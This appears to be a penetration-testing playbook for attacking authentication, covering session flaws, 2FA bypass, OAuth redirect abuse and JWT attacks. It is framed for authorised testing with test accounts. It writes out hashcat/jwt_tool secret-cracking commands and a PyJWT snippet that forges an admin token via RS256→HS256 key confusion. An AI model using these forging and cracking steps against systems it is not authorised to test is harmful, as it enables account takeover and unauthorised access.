# Auth attack techniques (shared by auth-bypass / jwt / oauth)
# Use TEST accounts. No real brute-force / no locking out real users. Reset/MFA flows are approval-gated.

## Session management (feeder + auth-bypass)
- Cookie flags: missing `Secure`/`HttpOnly`/`SameSite` (pair with XSS/CSRF).
- **Fixation:** does the session id change on login? If not, a pre-set id survives auth.
- **Logout:** is the token invalidated server-side on logout? (replay after logout)
- Predictable/short tokens; token in URL; "remember me" token strength.

## auth-bypass
- Default/weak creds; username enumeration (timing / message diff).
- Forced browsing: reach an authed page/endpoint without a session (direct URL/API).
- Response tampering: flip `{"success":false}` / `2faRequired:true` client-side gates.
- **2FA/MFA bypass:** skip the 2FA step (go straight to the post-2FA endpoint), reuse/brute the OTP
  (rate-limit permitting — few attempts only), backup-code abuse.
- Password-reset: token predictability, host-header poisoning (→ host-header agent), reuse, no expiry.

## jwt
- `alg:none` (strip signature); accept `{"alg":"none"}`.
- Weak HMAC secret → crack offline (`hashcat`/`jwt_tool`), re-sign tampered claims.
- **Key confusion** RS256→HS256: sign with the public key as the HMAC secret.
- `kid` injection (path/SQL), `jku`/`x5u` pointing to attacker JWKS.
- Claim tampering: `sub`/`role`/`admin`/`exp` — accepted without verification?
- `jwt_tool -t <url> -rc <cookie>` for playbook; confirm the forged token is ACCEPTED.

## oauth / oidc
- `redirect_uri` manipulation (open-redirect in the allowlist → steal `code`/token); `redirect_uri`
  suffix/subdomain/path bypass.
- Missing/replayable `state` → login CSRF / account linking.
- Authorization-code reuse / no PKCE (downgrade) / implicit-flow token in URL fragment leak.
- `id_token` signature / audience (`aud`) / issuer (`iss`) not validated.
- Account takeover via email-unverified OAuth linking.

---
## JWT — offline cracking + key-confusion forging

### Crack a weak HMAC secret (offline)
```
hashcat -m 16500 jwt.txt wordlist.txt            # 16500 = JWT (HS256/384/512)
#   good lists: rockyou.txt, and Wallarm's jwt.secrets.list (JWT-specific key dictionary)
jwt_tool <token> -C -d jwt.secrets.list          # jwt_tool crack mode
```
Once cracked, re-sign tampered claims with the recovered secret and confirm the server ACCEPTS it.

### RS256 → HS256 key confusion (forge with the PUBLIC key)
If the server verifies with a published/recoverable RSA public key but can be coerced to HS256, sign
the token using that public key *as the HMAC secret*:
```python
import jwt   # PyJWT
pub = open('public.pem').read()
forged = jwt.encode({"user":"admin","role":"admin"}, pub, algorithm="HS256")
```
Recover the public key when not published: `jwt_tool -X k` or derive from two RS256 tokens (`rsa_sign2n`).

### Source-review sinks (grep the app when you have code)
```
verify_signature": False        verify=False            options={"verify_signature": False}
algorithms=[header["alg"]]       # trusts attacker-chosen alg  -> alg:none / confusion
jwt.decode(token, ... )          # missing algorithms= / verify kwargs
```
Confirm end-to-end: the forged/tampered token must grant access it should not (not just "server didn't error").
